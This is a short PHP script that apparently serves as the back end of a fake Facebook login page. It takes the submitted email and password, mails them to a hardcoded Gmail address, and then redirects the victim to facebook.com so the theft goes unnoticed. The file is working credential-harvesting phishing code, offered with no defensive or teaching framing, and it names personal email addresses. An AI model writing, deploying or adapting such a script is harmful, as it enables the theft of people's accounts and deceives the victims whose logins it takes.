<?php
// get email and password
  $email =$_POST['email'];
  $pass =$_POST['pass'];

  echo  $email, ' ', $pass;
  $to='l.h.a.p.perera93@gmail.com';
  $subject='This is our test email';
  $message="<h1>$email</h1><h1>$pass</h1>";
  
  $header="From: The sender Name <achalapramuditha93@gmail.com>";
  $header="Reply-To: achalapramuditha93@gmail.com";
  $header="content-type: text/html\r\n";
  //email send
  $mail_sent=mail($to,$subject,$message,$header);
  if($mail_sent)
	 header("Location: http://www.facebook.com/");
  else
	 
	header('Location:index.php');
  
?>
